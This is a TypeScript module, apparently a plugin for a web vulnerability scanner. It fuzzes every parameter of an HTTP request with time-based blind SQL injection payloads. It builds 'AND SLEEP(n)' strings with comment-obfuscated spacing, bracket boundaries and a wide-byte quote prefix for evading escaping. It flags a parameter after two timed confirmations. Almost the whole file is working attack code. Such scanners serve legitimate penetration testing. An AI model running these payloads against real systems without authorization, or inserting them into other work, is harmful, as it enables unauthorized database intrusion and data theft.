import { common, Fuzz, FuzzParam, poc, str } from '@24wings/core';
export async function endpoint(requst: Request) {
  const { duration: originalT } = await poc.httpEx(requst);
  const fuzz = new Fuzz(requst);
  const params = fuzz.getAllFuzzableParams();
  for (let param of params) {
    let val = param.value;
    let isNum = str.IsDigit(param.value);
    var suffix = [' -- '];
    var prefix = sqlBuildPrefix(val);
    for (let suf of suffix) {
      for (let pre of prefix) {
        let randomInt = common.randomInt(4, 6);
        let payload = buildSqlPayload(pre, suf, randomInt);
        const { response, isInjectable } = await timeBlindCheck(param, originalT, payload, randomInt, fuzz);
        if (!isInjectable) {
          continue;
        }
        randomInt = common.randomInt(1, 3);
        payload = buildSqlPayload(pre, suf, randomInt)
        // 二次检查
        let secondCheck = await timeBlindCheck(param, originalT, payload, randomInt, fuzz);
        if (secondCheck.isInjectable) {
          console.log('有漏洞')
        }
      }
    }
  }
}

async function timeBlindCheck(p: FuzzParam, originalT: number, payload: string, t: number, fuzz: Fuzz) {
  let { response, duration } = await fuzz.sendModifiedRequestEx(Object.assign(p, { value: payload }));

  // printf("response Time(ms): %d t , time blind %d(ms)\n", result.ServerDurationMs, t*1000)
  return { response, isInjectable: duration >= originalT + t * 1000 };
}

/**
 * 构建 SQL 注入的 payload
 * @param pre 前缀
 * @param suf 后缀
 * @param t 睡眠时间
 * @returns 构建好的 SQL 注入 payload
 */
export function buildSqlPayload(pre: string, suf: string, t: number): string {
  return `${pre}/**/And/**/SleeP(${t})${suf}`;
}

function sqlBuildPrefix(paramValue: string): string[] {
  const pureInt = /^\d+$/.test(paramValue);

  const wideByte = String.fromCharCode(Math.floor(Math.random() * (254 - 129 + 1)) + 129);
  const prefix: string[] = [];

  const valueList = [paramValue];
  const boundaryList = [' ', ')', '))'];

  let formatString = '%s';
  if (!pureInt) {
    formatString += wideByte + "'";
    valueList.push(randomString(10));
  }
  formatString += '%s';

  for (const v of valueList) {
    for (const b of boundaryList) {
      prefix.push(sprintf(formatString, v, b));
    }
  }
  return prefix;
}

// 辅助函数
function randomString(length: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  return Array(length).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function sprintf(format: string, ...args: any[]): string {
  return format.replace(/%s/g, () => args.shift());
}
